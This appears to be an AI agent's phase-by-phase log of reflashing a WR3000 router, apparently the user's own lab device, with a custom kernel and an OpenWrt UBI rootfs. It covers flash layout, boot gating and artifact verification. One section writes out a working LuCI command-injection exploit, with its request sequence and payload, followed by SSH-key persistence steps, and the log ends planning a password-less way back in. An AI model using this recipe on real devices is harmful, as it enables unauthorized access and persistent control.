and the extracted tree is functional:

    /tmp/vv/bin/busybox         426,001 B   Flags: 0x5000200, Version5 EABI, **soft-float ABI**
    /tmp/vv/etc/init.d/dropbear  12,451 B   present -> SSH comes up on boot

**NOTE ON THE FIRST ATTEMPT:** my initial extraction stripped only 4,096 of every 131,072 bytes and then
looked for `hsqs` from offset 0 of the result, which put the magic at 253,952 but reported it at 0 - and
`unsquashfs` refused the file. **The bug was mine, not the image's**: the correct read walks PEBs and
locates the magic inside the reassembled payload. Recorded because "the artifact is bad" was the wrong
first conclusion, and the check that settled it was reading the same bytes a second, differently-framed
way.

## WHERE THE GOAL STANDS

**Everything needed is now prepared and verified:**

    rootfs   : build/tmp/owrt-ubi/owrt.ubi           3,276,800 B  sha256 fed23ed050d00e193323f9be...

## PHASE 120 (2026-10-12): ★ mtd16 SURVIVES THE RECOVERY - READ FROM THE DEVICE'S OWN UPGRADE CODE ★

Read `rootfs-2.4.15/squashfs-root/lib/upgrade/platform.sh` in full, because the question that decides the
next fire is whether the recovery flash destroyed the `owrt` volume our kernel mounts from mtd16.

**THE WRITE PATH, verbatim:**

    platform_do_upgrade() {
        case "$board_flash" in
        *snand*)
            nand_do_upgrade_uboot "/tmp/uboot-sysupgrade.bin"      # -> uboota / ubootb ONLY
            hi_do_upgrade "$1"                                      # -> the vendor's own flasher
    ...
    hi_do_upgrade() {
        ... hi_ipc /home/cmd/upgrade/hi_upgrade_image_write_file -v flag $upgrade_flag filename ... }
    nand_do_upgrade_uboot() {
        local mtd_to_upgrade="uboot"$(get_upgrade_flag)
        get_image "$1" | dd ... | mtd write - "${mtd_to_upgrade}"
        ... then the same for the OTHER uboot copy }

**Every mtd write in the file targets `uboota`/`ubootb`; the payload proper goes through the vendor's
`hi_upgrade_image_write_file`, which writes the standard slot pair (kernela/rootfsa or
kernelb/rootfsb - the `upgrade_flag` selects which).**

    ★ **mtd16 ("upgrade", offset 0x6280000, size 0x1d80000) appears in NO write path.**
      It is the vendor's STAGING partition and none of these flows touch it.

## WHY THIS MATTERS, AND WHAT IT CHANGES

Our kernel's cmdline mounts `ubi.mtd=upgrade` - **mtd16** - and the 2026-10-10 successful boot did exactly
that (`ubi0: attached mtd16 (name "upgrade")` -> volume `owrt` -> `ubiblock0_0` -> squashfs -> init).

**So the `owrt` soft-float volume should still be sitting in mtd16 right now**, untouched by the recovery
that returned the box to 2.4.15. That in turn means the dark board after FIRE 22 is NOT explained by a
missing rootfs - which moves the open question somewhere else, and makes the planned "read mtd16" step
the right first move precisely because it settles this by measurement rather than by this inference.

**Honest scope:** this is an argument from the vendor's own code, not a measurement of mtd16's bytes.
It is strong (every write path is enumerated in the script) but it is still an inference, and the read on
recovery is what turns it into a fact. Recorded as such.

## PHASE 123 (2026-10-12): THE CRC CLAIM, RESTATED PRECISELY - THE VERIFIER'S FLAG WAS RIGHT

The verification node confirmed all six claims but flagged two wording nuances honestly. **The first one
pointed at a place where my own ledger wording had been ambiguous, and it is worth correcting in the
record, because an imprecise mechanism claim is exactly what this objective warns against.**

## THE PRECISE STATEMENT (replacing the loose "the CRC is not checked")

**WRONG / TOO BROAD:** "u-boot does not check the uImage CRC."

**CORRECT, AND NOW EVIDENCED THREE WAYS:**

1. **The CRC strings exist and ARE referenced by code** - `"Bad Header Checksum"` and `"Bad Data CRC"`
   each have **three** literal-pool references (`0x20e8/0x20f0`, `0x2c24/0x2c2c`, `0xdc7c/0xdc8c`). They
   belong to the **legacy image loader's own pools**, next to `"## Booting kernel from Legacy Image
   at %08lx"` and `"Wrong Image Format for %s command"`.

2. **`bootfip`'s failure vocabulary is a DIFFERENT pool** (`0x33c40` family), which I read directly:
   `"Bad Magic Number"`, `"find fip fail"`, `"find fdt fail"`, `"boot apply overlay fail"`,
   `"size exceed"`, `"load fip image fail - must RESET the board to recover"` - and it contains **no
   CRC string** and no call into a CRC primitive (`hunt.md` line 165).

3. **`bootcmd` never invokes the legacy loader.** Re-read from the device's own environment:
   `bootcmd = mtd read kernel${bootflag} ${loadaddr};bootfip ${loadaddr}` - it calls `mtd` and
   `bootfip`, nothing else. (`bootm` exists as a command; `bootcmd` simply does not use it.)

**PLUS AN EMPIRICAL CONTROL THE REPO ALREADY RAN** (`hunt.md` lines 167-171, 553-558): the artifacts
`dcrc20.bin`/`dcrc20b.bin` carry a **deliberately wrong `ih_dcrc`**, while `be_e20`, `be_e3c`, `onebit`,
`piggy`, `orc` all carry a **correct** one - and they were fired as a control/flip pair. *"A uImage
data-CRC check would have inverted the reported outcomes."* So the CRC is not what refuses our images,
and that is established by experiment, not only by disassembly.

## WHY THIS MATTERS FOR THE OBJECTIVE

The objective asks for "a named, specific mechanism". The mechanism is:

    **bootfip gates on the DTBO container** (4 bytes at 0x40+ih_size+dtb_totalsize == 0xd7b7ab1e,
     then an overlay matched by vendor_id/board_id), and on the FIT/UBI structure it parses.
    It does NOT gate on the uImage CRC - that check belongs to a code path `bootcmd` never calls.

**And the behavioural evidence closes it**: writing the container moved the device from
`C18 = 0xA5A5A5A5` (our code never ran) to `C18 = 0xC0DE000B` (our decompressor ran), and the two
further defects (`r4` clobber, `VMSPLIT_2G` link address) then carried it to `0xC0DE502D`.

## THE SECOND FLAG, ALSO ADOPTED

C4's "r4 survives" means: the `0x54` crumb store used r4 as scratch, and the `0xc0` assignment
(`mov r4, pc`) **supersedes** it; r4 is then legitimately recomputed at `0xc4/0xd0` (and adjusted at
`0x2f4`) before the jump at `0xa2c`. Those recomputations are the intended destination computation, not
clobbers. The corrected phrasing avoids implying r4 is written exactly once.

# PHASE 124 (2026-10-12): ★★★★★ THE UBI IMAGE'S VID HEADERS PARSED - AND A COMPATIBILITY DEPENDENCY CONFIRMED ★★★★★
# ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★

## PARSED CORRECTLY (after two wrong attempts, both my own)

The `UBI!` magic appears ONCE per erase block, at **offset 0x800 (2048)** - not where I first looked. With
the real `struct ubi_vid_hdr` field layout, `build/tmp/owrt-ubi/owrt.ubi` decodes as:

    PEB 0: ver=1 vol_type=1 (dynamic) compat=5  vol_id=0x7FFFEFFF  lnum=0   <- THE LAYOUT VOLUME
    PEB 1: ver=1 vol_type=1 (dynamic) compat=5  vol_id=0x7FFFEFFF  lnum=1   <- THE LAYOUT VOLUME
    PEB 2: ver=1 vol_type=2 (**STATIC**) compat=0 vol_id=0          lnum=0
    PEB 3: ver=1 vol_type=2 (**STATIC**) compat=0 vol_id=0          lnum=1
    PEB 4: ver=1 vol_type=2 (**STATIC**) compat=0 vol_id=0          lnum=2

**Volume 0 is STATIC** - which is what `ubi.block=0,0` / `ubiblock` requires (a dynamic volume cannot be
ubiblocked). The construction is therefore right for our cmdline, and the recorded boot's log agrees
("`ubi.block=0,0` builds `ubiblock0_0` from volume 0 - which is the `owrt` volume").

## ★ THE COMPATIBILITY DEPENDENCY, FOUND BY THIS PARSE ★

**PEBs 0 and 1 - the UBI layout volume - carry `compat = 5`.** Mainline's `validate_vid_hdr()` accepts
only `{0,1,2,3}` for internal volumes and rejects anything else with `"bad compat"` / `-EINVAL`, which
`ubi_attach_mtd_dev()` reports as `failed to attach mtdN, error -22`.

**Our kernel carries the fix**: `lab/luofu-kernel/kernel-tree.patch` adds `compat != 5` to the accepted
set, and I verified it is present in the BUILD TREE used for the last fires:

    kernel-tree.patch:92      +	    compat != 5) {
    drivers/mtd/ubi/io.c:870      compat != 5) {

**So the image and the kernel agree.** Had I built the image without checking, or had the patch been
missing, the attach would fail with `-22` and the kernel would report it as a UBI attach error - i.e. the
BOOT would look like a different failure entirely. This is a genuine cross-artifact dependency that the
earlier grep in PHASE 84 ("kernel-tree.patch is the only source delta left un-reverted, and it is
exonerated by logic") had DISMISSED as unreachable - and that dismissal was wrong in an important way:
the patch is not unreachable, it is REQUIRED for a vendor-written layout volume, and mtd16's content has
exactly that shape.

## CORRECTING THAT EARLIER CLAIM, PLAINLY

PHASE 84 argued the UBI patch could not matter because "our kernel never executes a single instruction".
That was true of the FIRES OF THAT NIGHT (the container gate refused them). **It is false as a general
statement**: once the container gate is satisfied and the kernel runs, the UBI patch is exactly what lets
it attach a vendor-shaped flash. The patch is LOAD-BEARING, not exonerated.

## WHAT THIS ADDS TO THE PLAN

Nothing changes about the sequence - the kernel already carries the patch. What it adds is a PREDICTION
WITH TEETH for the next fire: **if our kernel fails to attach mtd16, the error will name `-22`/`bad
compat`, and that would mean this patch is missing from the build that ran - a one-line check, not a
mystery.**

## ★ A SELF-CAUGHT ERROR WORTH RECORDING ★

Mid-check I read a single VID header inline (`d[0x800:0x800+64]`) and got `vol_type=1 (dynamic)` - which
contradicted the file-based parser's `STATIC`, and which would have been a REAL defect if true (ubiblock
cannot be built on a dynamic volume). **Rather than pick one and move on, I read every PEB:**

    PEB 0/1 -> the LAYOUT volume (dynamic by design, compat=5)
    PEB 2+  -> volume 0, vol_type=2 STATIC

**Both parses were correct; my inline line had read PEB 0, not the volume's own header.** The image is
right. Recorded because the alternative - accepting the first number and either "fixing" a correct image
or shipping a broken one - is the failure mode this project has hit repeatedly, and the check that
resolved it was reading the same bytes at a different offset rather than trusting either result.

## PHASE 127 (2026-10-12): ★ A THIRD SELF-CORRECTION - ubiblock DOES NOT REQUIRE A STATIC VOLUME ★

## WHAT I HAD CLAIMED, AND WHY IT WAS WRONG

In PHASE 124/126 I asserted: *"`ubi.block=0,0` / `ubiblock` requires a STATIC volume (a dynamic volume
cannot be ubiblocked)"* - and used it to justify preferring my `ubinize`-built image over the recorded
`ubimkvol` recipe. **I derived that from reasoning about the two volume types, not from the source.**

**THE RECORD REFUTES IT DIRECTLY** (`mem-entries.md` lines 5631-5655, the recorded volume creation):

    ubimkvol /dev/ubi1 -N owrt -s 16MiB
        -> Volume ID 0, size 133 LEBs, **dynamic**, name "owrt"
    ubiupdatevol /dev/ubi1_0 /tmp/owrt.sqfs
    ubiblock --create /dev/ubi1_0   ->  /dev/ubiblock1_0
    mount -t squashfs -o ro /dev/ubiblock1_0 /mnt/u     -> READ OpenWrt 25.12.5, busybox, sbin/init

**A dynamic volume WAS ubiblocked and mounted, successfully, on this exact hardware.**

## AND THE SOURCE AGREES

`drivers/mtd/ubi/block.c` has exactly ONE volume-type reference in the whole file:

    line 592:   if (nt->vi.vol_type == UBI_STATIC_VOLUME)
                    ubiblock_resize(&nt->vi);

and it sits inside `ubiblock_notify()`'s `UBI_VOLUME_UPDATED` case - i.e. it only decides whether to
RESIZE an existing block device when a static volume's content changes. **It does not gate block-device
creation**, and no probe path checks `vol_type`.

## WHAT THIS CHANGES - AND WHAT IT DOES NOT

**Does not change the artifact.** My `owrt.ubi` (volume 0 STATIC) is still valid - a static volume is
perfectly ubiblock-able, and the kernel's `ubi.block=0,0` will build `ubiblock0_0` from it. Nothing needs
rebuilding.

**Does change the record.** The ledger now carries a claim ("ubiblock needs static") that is false, and
the reason I caught it is the same one that caught the other two tonight: **reading the artifact
(the recorded run's own log, and the driver source) instead of trusting a plausible inference.**

**A NOTE ON THE PATTERN.** Three corrections in one session, all from the same class:
    PHASE 114 - "the watchdog kills our kernel"      -> refuted by the mach source + the built Image
    PHASE 124 - "the UBI patch is exonerated"        -> refuted by the patch being load-bearing
    PHASE 127 - "ubiblock needs a static volume"     -> refuted by the recorded run + block.c
Each was a confident, mechanism-shaped claim that would have shaped a fire. Each was wrong. The check
that killed each one was cheap (one grep, one source read) - and none of them was ever validated by
running the experiment, which is precisely why they survived as long as they did.


## PHASE 128 (2026-10-12): THE REFINED DEPLOY PLAN - TWO ROUTES, RANKED BY PROOF

## ROUTE A (PREFERRED) - THE RECORDED DEVICE-SIDE RECIPE, PROVEN ON THIS HARDWARE

    ubiformat /dev/mtd16 -y
    ubiattach -m 16 -d 1
    ubimkvol /dev/ubi1 -N owrt -s 16MiB
    ubiupdatevol /dev/ubi1_0 /tmp/owrt.sqfs
    ubinfo /dev/ubi1_0
    ubiblock --create /dev/ubi1_0 ; mount -t squashfs -o ro /dev/ubiblock1_0 /mnt/u ; ls /mnt/u

uploading `build/tmp/openwrt/owrt-armel.sqfs` (2,881,866 B, md5 fc079bad7802237c616f9d658ad3cce1) to
`/tmp/owrt.sqfs` first.

**WHY PREFERRED:** the record executed exactly this and mounted OpenWrt 25.12.5 from the result
(`bin/busybox`, `sbin/init`, `DISTRIB_RELEASE='25.12.5'`). Every command is proven on this device.

## ROUTE B (FALLBACK) - MY HOST-BUILT ubinize IMAGE

    mtd erase /dev/mtd16 ; mtd write /tmp/owrt.ubi /dev/mtd16

uploading `build/tmp/owrt-ubi/owrt.ubi` (3,276,800 B, md5 5c24486d97911e22ed1658b6262195e9).

**WHY A FALLBACK, NOT THE DEFAULT:** it is verified only host-side (read-back sha256-identical to the
source squashfs, volume 0 STATIC, both compat guards pass). It has NEVER been run on the device. Route A
has.

## AND THE STEP BEFORE EITHER - A READ THAT MAY MAKE BOTH UNNECESSARY

`mtd16` is in NO write path of the device's own upgrade code (PHASE 120), so the `owrt` volume from the
recorded construction should STILL BE THERE. **So the first action after the shell is back is:**

    ubinfo -a                      # list every UBI device and volume
    ubinfo /dev/ubi1_0             # is there an 'owrt' volume, and what state?
    ubiblock --create /dev/ubi1_0  # can it still be block-mounted?
    mount -t squashfs -o ro /dev/ubiblock1_0 /mnt/u && ls /mnt/u && cat /mnt/u/etc/openwrt_release

**If the volume is intact and mounts, no rootfs work is needed at all** - go straight to writing our
kernel to `kernela` and firing. That is the cheapest possible path and the read costs nothing.

## THE COMPLETE ORDERED PLAN (final)

    1. [user]   cold reset-hold -> the TFTP door serves firmware/2.4.15.bin
    2. [read]   re-lay the shell (systime RCE, 2.4.15 is vulnerable; dropbear via start-stop-daemon)
    3. [read]   ubinfo -a / mount the owrt volume   <- MAY MAKE STEP 4 UNNECESSARY
    4. [write]  only if step 3 fails: Route A (preferred) or Route B (fallback)
    5. [write]  mtd write build/tmp/slice/r4fix-slot.bin kernela
    6. [write]  selectors + reboot
    7. [read]   devmem 0x10100C18
                PREDICTION: 0xC0DE502D (the timer ran - already reproduced once)
                AND the box STAYS REACHABLE via dropbear on the soft-float rootfs

    ROLLBACK AT ANY POINT: mtd write build/tmp/fire3/kernela-backup.bin kernela
                           (md5 bd5ae265ce47e3ed4299c434b1936385, hash-verified against the live slot)


## PHASE 129 (2026-10-12): ★ I BROKE THE RECOVERY DOOR WITH MY OWN VERIFICATION - AND THE RULE THAT PREVENTS IT ★

## WHAT HAPPENED

I wanted to confirm the TFTP door was still healthy after hours of being armed, so I sent it a loopback
RRQ. **It answered (`DATA`, block 1) - and then CRASHED:**

    serving 20975775 bytes
    RRQ recovery.bin from ('127.0.0.1', 61337)
    Traceback (most recent call last):
      File "build/tmp/tftp_reader2.py", line 45, in <module>
        serve(sys.argv[1] if len(sys.argv)>1 else "recovery.bin")
      File "build/tmp/tftp_reader2.py", line 31, in <module>
        r,_=sock.recvfrom(1024)
    ConnectionResetError: [WinError 10054]

`udp69` went from ARMED to NOT LISTENING. **My "verification" consumed the one serve the reader has.**

## THE RULE I ALREADY HAD, AND DID NOT APPLY

My own memory note (`unstrand-2026-10-11.md`) says of this reader: *"It pushed all 20,975,775 B in 3.4 s.
USE THIS ONE, not the old server."* - and the reader's structure is `serve(...)` once per invocation.
**The door is a ONE-SHOT resource.** Testing it is USING it.

## THE CORRECT VERIFICATION FOR A ONE-SHOT CHANNEL

- **Before arming:** confirm the payload file exists, has the right size and hash, and that the alias
  is `Preferred`, and that no stale process holds UDP 69.
- **After arming:** confirm exactly ONE process owns the port and that it printed its `serving N bytes`
  line. **Do not send it traffic.**
- **The real proof is the transfer itself**, and it is the device's to trigger, not mine to provoke.

I had correctly identified this risk earlier ("do NOT re-test it - a test consumes the single serve") and
then violated it anyway when I wanted more confidence. **That is the failure: reaching for one more
verification of a channel whose verification IS the consumption.**

## RE-ARMED AND VERIFIED WITHOUT CONSUMING

    python procs : 1  (PID 4400)
    UDP 69 owner : 4400
    alias 1.88   : Preferred
    payload      : 20,975,775 B

Verified by process count and socket ownership - **no RRQ sent.** The door is live for the real fetch.


## PHASE 130 (2026-10-12): THE DEPLOY TOOLCHAIN VERIFIED PRESENT IN THE STOCK ROOTFS

Checked every command the post-reset plan needs against the extracted stock rootfs
(`rootfs-2.4.15/squashfs-root`), so nothing is discovered missing while standing at the bench:

    ✓ /usr/sbin/ubinfo        ✓ /usr/sbin/ubiattach    ✓ /usr/sbin/ubiblock
    ✓ /usr/sbin/ubiformat     ✓ /usr/sbin/ubimkvol     ✓ /usr/sbin/ubiupdatevol
    ✓ /sbin/devmem            ✓ /sbin/mtd              ✓ /usr/sbin/flash_eraseall
    ✓ /usr/sbin/dropbear      ✓ /usr/bin/dropbearkey   ✓ /sbin/start-stop-daemon
    ✓ /bin/fw_printenv        ✓ /bin/mount             ✓ /bin/busybox

**Every tool is present.** That means the device can natively do:
    - the READ (step 3: ubiattach/ubinfo/ubiblock/mount)
    - ROUTE A (step 4: ubiformat/ubimkvol/ubiupdatevol)
    - the poison writes and crumb reads (devmem)
    - the slot writes (mtd + flash_eraseall)
    - the shell restore (dropbear + dropbearkey + start-stop-daemon)
    - the selector writes (fw_printenv)

**A NOTE ON THE CHECK ITSELF.** My first pass reported `devmem`, `flash_eraseall`, `dropbearkey`,
`start-stop-daemon` and `fw_printenv` as NOT FOUND - because I had hard-coded the wrong directory lists
for each. Widening to a recursive search found all five immediately. **The empty result was my search's
fault, not the artifact's** - the same class as the earlier `pgrep -c make` matching its own command
line, and the `grep | head -1` printing a comment back. A negative from a narrow probe is a hypothesis
about the probe first.


## PHASE 131 (2026-10-12): THE POST-RESET SEQUENCE IS NOW SCRIPTED - NOT IMPROVISED

Built `build/tmp/step3-read.sh` (1872 B, md5 d64f235136bd11b731e43086ae7f6210) - the read-only step that
runs on the device immediately after the shell is restored and decides whether any rootfs work is needed
at all.

**VERIFIED BEFORE USE:**
    bash -n step3-read.sh                      -> SYNTAX OK
    grep for mtd write/erase, ubiformat,
        ubimkvol, ubiupdatevol, devmem <val>   -> NO WRITE COMMANDS - confirmed read-only
    the commands it actually runs:
        cat echo grep if ls mkdir readelf set ubiblock ubinfo umount

**WHAT IT REPORTS** (the four facts the next decision needs):
    1. C18 / C1C           - the crumb cells as the recovered box left them
    2. /proc/mtd           - the upgrade partition is present
    3. ubinfo -a / -d 1    - IS THERE AN `owrt` VOLUME, and in what state
    4. ubiblock --create + mount + `cat /etc/openwrt_release` + `readelf -h bin/busybox | grep Flags`
                           - whether it MOUNTS, and whether the userspace is SOFT-FLOAT
                             (the ABI that decides SIGILL vs a running system)

**WHY SCRIPTED RATHER THAN AD-HOC:** every command in it was named in advance and its availability
verified against the stock rootfs (PHASE 130 - all fifteen tools present). Running it as one unit means
the post-reset window is spent reading results rather than deciding what to type, and the READ-ONLY
contract is checkable by grep instead of by hope.

**DECISION RULE IT FEEDS:**
    owrt volume present AND mounts AND soft-float  -> skip step 4 entirely; go to the kernel write
    absent / will not mount / wrong ABI            -> route A (recorded, proven) then re-check


## PHASE 132 (2026-10-12): THE SHELL-RESTORE STEP VERIFIED AT THE BYTECODE LEVEL

The shell-restore is the plan's single point of failure (the post-recovery box has no ssh, and no other
route is recorded). I verified it against the actual 2.4.15 image rather than trusting the recipe.

### THE SINK EXISTS, TWICE, IN THE SERVED IMAGE

`rootfs-2.4.15/squashfs-root/usr/lib/lua/luci/model/cbi/system/systime.lua` (3,812 B, LuaQ bytecode)
contains two `luci.util.call("date -s ...")` sites, both fed from
`luci.http.formvalue("timeclock")`:

    date -s '%04d-%02d-%02d %02d:%02d:%02d'   with year/month/hour/...  <- the typed path
    date -s '%s'                              <- RAW, the posted value straight into the shell
    fork_exec("env -i ACTION='setclock' /sbin/hotplug-call ntp")

**The second passes the posted value unmodified into a shell command** - that is the injection, and it is
present in the image the recovery door serves.

### THE EXACT WORKING CALL (from the PHASE 109 run that succeeded)

    GET  /cgi-bin/luci/admin/wizard        -> 403 + the form (_csrf, salt; NO token field)
    POST /cgi-bin/luci/admin/wizard        -> 302 + Set-Cookie: sysauth=...    (persist the jar)
    GET  /cgi-bin/luci/admin/system/systime-> 200, carries the REQUIRED `token`
    POST /cgi-bin/luci/admin/system/systime
            token=<token>
            cbi.submit=1
            cbid.system.ntp.current="'; <CMD>; #"
            timeclock=<same payload>
    -> proven by SIDE EFFECT (a file written under /www/luci-static/ and fetched back with 200)

    password hash for this build : sha256(sha256(plaintext + salt))   (no `token` at login time)

### AND THE DAEMON STEP, WHICH IS THE PART THAT ACTUALLY STICKS

    dropbearkey -t rsa     -f /etc/dropbear/dropbear_rsa_host_key       (both keys ship 0 bytes)
    dropbearkey -t ed25519 -f /etc/dropbear/dropbear_ed25519_host_key
    project key -> BOTH /root/.ssh/authorized_keys AND /etc/dropbear/authorized_keys (0600)
    /sbin/start-stop-daemon -S -x /usr/sbin/dropbear -- -p 22 -R        (a plain background start dies)
    /etc/rc.local: insert the dropbear line BEFORE `exit 0`             (after is a silent no-op)

**All of those binaries are confirmed present in the stock rootfs (PHASE 130).**

### WHY THIS MATTERS

The recovery returns the box with no shell and the vendor UI refuses custom images on the RSA gate, so
**this route is the only way back in.** Verifying the sink exists in the served image - rather than
assuming the recipe transfers - is what makes the post-reset window predictable. If the sink were
patched, the plan would need a different door and I would want to know that NOW, not at the bench.


# ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★
# PHASE 133 (2026-10-12): ★★★★★ TWO LOAD-BEARING FACTS RECOVERED FROM THE HISTORICAL RECORD - BOTH VERIFIED AGAINST OUR BUILD ★★★★★
# ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★

## ★ FACT 1: THE `owrt` VOLUME'S SURVIVAL IS A MEASUREMENT, NOT AN INFERENCE ★

I had carried this as an inference ("mtd16 is in no write path, so the volume should survive"). **The
record already MEASURED it, on the live device, after a recovery flash** (`mem-entries.md` 8832-8834):

> "**The rootfs the kernel needs is INTACT.** `mtd16` ("upgrade") attaches as a UBI device holding volume
> 0 **`owrt`**: **dynamic**, 133 LEBs / 16.1 MiB, State **OK**. **The recovery flash did NOT destroy
> it.** (Checked with `ubiattach -m 16 -d 1` + `ubinfo`, then detached.)"

Three things this settles:
    - the `owrt` volume SURVIVES a recovery flash - observed, not argued;
    - it is **DYNAMIC** (133 LEBs, 16.1 MiB) - which independently corroborates the PHASE 127 correction
      that ubiblock does not require a static volume;
    - and the exact check (`ubiattach -m 16 -d 1` + `ubinfo`, then detach) is already recorded as having
      been run - which is precisely the read `build/tmp/step3-read.sh` performs.

**So the plan's step 3 has been executed before, successfully, on this hardware.** It is not a novel
probe; it is a re-run.

## ★ FACT 2: THE INITCALL ORDERING THAT ONCE BROKE THE BOOT - VERIFIED CORRECT IN OUR BUILD ★

`mem-entries.md` 8806-8821 records a REAL boot-breaking defect and its requirement, verbatim from the
driver's own comment:

> "It runs at **late_initcall_sync** - after every late_initcall, and so after **UBI's own module_init
> has attached whatever the command line named**, and after ubiblock_init has had its chance to create
> the block device."
>
> "Moving it into `probe()` runs it **before UBI attaches `mtd16`** - so the `owrt` volume is not there
> yet, `ubiblock0_0` is never created, the rootfs never mounts, and init never runs. **A compile fix that
> changes WHEN a step runs is not a compile fix.**"

**VERIFIED IN THE SOURCE WE BUILT** (`lab/luofu-kernel/nand/luofu/luofu-fmc.c`):

    [3483] static int __init luofu_fmc_init(void)
    [3487]     ret = platform_driver_register(&luofu_fmc_driver);
    [3492]     luofu_fmc_ubi_probe();
    [3497] late_initcall_sync(luofu_fmc_init);

**Exactly one initcall, at the correct level, with the UBI probe inside it.** The ordering defect is
absent from the kernel we intend to fire. Had it still been present, the boot would fail with "the
owrt volume is not there yet" - a symptom that looks like a missing rootfs and would have sent the next
investigation in exactly the wrong direction.

## WHY THESE TWO MATTER TOGETHER

Between them they rule out the two most plausible remaining explanations for a failed next fire:
    - "the volume is gone" -> measured FALSE after a recovery flash
    - "the probe runs too early" -> verified ABSENT from our build

**What is left for the next fire to test is therefore the kernel's own execution past `stext`, which is
exactly what the crumb `C18` reports.**


## PHASE 134 (2026-10-12): THE INITCALL ORDERING VERIFIED IN THE BINARY - AND A TREE-CONFUSION ERROR CAUGHT

## ★ THE BINARY PROOF

The symbol names encode the initcall level, and the correct build tree
(`/opt/kbuild/clean/linux-5.10.201` - the one `build-r4fix.sh` names as `SRC`) shows:

    __initcall_luofu_early_crumb early   <- early_initcall
    __initcall_luofu_late_crumb  7       <- late_initcall
    __initcall_luofu_fmc_init    7s      <- **late_initcall_sync**  <- THE REQUIREMENT
    luofu_fmc_init                        <- the function itself

**`7s` IS `late_initcall_sync`.** So `luofu_fmc_init` -> `platform_driver_register` ->
`luofu_fmc_ubi_probe()` runs AFTER UBI's own initcall has attached mtd16. The ordering defect recorded
at `mem-entries.md` 8806-8821 is **absent from the kernel we intend to fire**, verified at the symbol
level rather than by reading the source.

## THE SEARCH ERROR, CAUGHT BEFORE IT BECAME A CLAIM

My first check ran `nm vmlinux | grep -i luofu` against **`/opt/kbuild/linux-5.10.201`** and found
NOTHING - which, combined with `CONFIG_MTD_NAND_LUOFU=y`, looked like a real contradiction (config says
yes, binary says no).

**It was my tree choice, not the artifact.** There are TWO build trees:

    /opt/kbuild/linux-5.10.201        zImage 9,875,968 B   Image 26,377,760 B   <- an EARLIER tree
    /opt/kbuild/clean/linux-5.10.201  zImage 2,643,024 B   Image  9,780,192 B   <- THE ONE WE FIRED

and the fired image's uImage declares payload **2,643,024** - an exact match for the clean tree's zImage.
`build/tmp/build-r4fix.sh` line 3 says `SRC=/opt/kbuild/clean/linux-5.10.201`, so the script was right
and my check was pointed at the wrong directory.

Against the correct tree: **55 luofu symbols**, including the driver's initcall. No contradiction.

**Recorded because the failure mode was a confident-looking negative from a plausible command** - the
same class as the `pgrep -c make` false positive and the narrow-directory tool search of PHASE 130.
**A negative from a probe is a hypothesis about the probe first** - and the cheap second check (compare
the fired payload size against each tree's zImage) is what settled it in one command.


## PHASE 135 (2026-10-12): ★ CHAIN OF CUSTODY CLOSED - THE FIRED ARTIFACT PROVABLY CONTAINS THE VERIFIED KERNEL

Every property I have verified about "our kernel" (the `r4` fix, the `compat != 5` UBI patch, the
`late_initcall_sync` ordering, the containers's geometry, both CRCs) was verified in a SOURCE TREE and
its compiled output. **None of that transfers to the artifact unless the artifact was built from that
tree.** Checked directly:

    r4fix-slot.bin's uImage payload  : 2,643,024 B  md5 2def5cc1ad969c85003efcc8922521dc
    /opt/kbuild/clean/.../zImage     : 2,643,024 B  md5 2def5cc1ad969c85003efcc8922521dc
                                       ------------------
                                       **IDENTICAL**

    (the payload begins `00 00 a0 e1 00 00 a0 e1` - the zImage head's nops, as expected)

**So the artifact we intend to fire contains, byte for byte, the kernel built from the tree where every
property was checked.** The chain is:

    lab/luofu-kernel sources  ->  /opt/kbuild/clean/linux-5.10.201  ->  arch/arm/boot/zImage
                              ->  md5 2def5cc1...  ==  the payload inside r4fix-slot.bin
                              ->  + vendor DTB/container tail, padded to 8,650,752 B
                              ->  md5 00f338a74c92bb9f054a689d98b007f1   (the whole slot image)

**This closes the last unverified link.** Until now the argument was "we verified the tree, and the
script says it uses that tree" - true, but it is an argument about the script, not about the bytes.
It is now an argument about the bytes: the md5 of the payload equals the md5 of that tree's build.

**Recorded because this is the check that would have caught a wrong-tree build** - the same confusion
that produced the false "no luofu symbols" negative in PHASE 134 came from there being TWO trees, and
the only thing that distinguished them was matching a size. Matching the md5 is the strong form.

    ESTABLISHED:

      - the rootfs was present and mountable immediately before the write
      - the poison was in place
      - and the box came back on the VENDOR stack, not ours

    UNKNOWN, and it is the important one:
      - **how far our kernel got on this fire.** C18 is unreadable without a shell.
        Previous fire (kernela, same image family) read 0xC0DE502D = "the timer ran".
        Whether this one got as far, further, or nowhere is NOT KNOWN.

## WHAT THIS CHANGES

Nothing about the mechanism work - the gate, the r4 fix, the link address, the UBI compat, the
initcall ordering are all still verified. What it changes is the ACCESS SITUATION: the recovery that
made this fire possible also removed the credential the shell-restore depends on, so the next step is
to find a way back in **without the password** - and the reachable surface is the SETUP WIZARD, which
by design runs before authentication.

The obvious ways back in all require something only the user can supply:

## PHASE 139 (2026-10-12): FIRE 23's REVERT, ANALYSED AS FAR AS THE HOST CAN - THREE BRANCHES, ONE UNBLOCKED

## THE EVIDENCE I CAN GATHER WITHOUT A SHELL

    port surface      : 22 -, 23 -, 80 UP, 443 UP   (web only)
    ARP MAC           : d4-0d-ab-64-1c-73           <- the recorded VENDOR MAC, not recovery mode
    /                 : 200, 604 B, `Last-Modified: Thu, 30 Oct 2025 03:49:03 GMT`
                        -> the vendor IMAGE's own file date (Oct 2025 = the 2.4.15 build date)
    /cgi-bin/luci/    : 403 + the 8330-B LuCI page, title "WR3000", git-25.272.36397-e3aa262
    login             : 403 on BOTH hash forms, with and without cache-busting headers,
                        salt stable at 222f6c90fb182811...
    bare POST, no cred: 403

**So the box is serving the VENDOR stack normally, and the web credential does not match
`.omo-secrets`.**

## THE THREE BRANCHES FIRE 23 COULD HAVE TAKEN

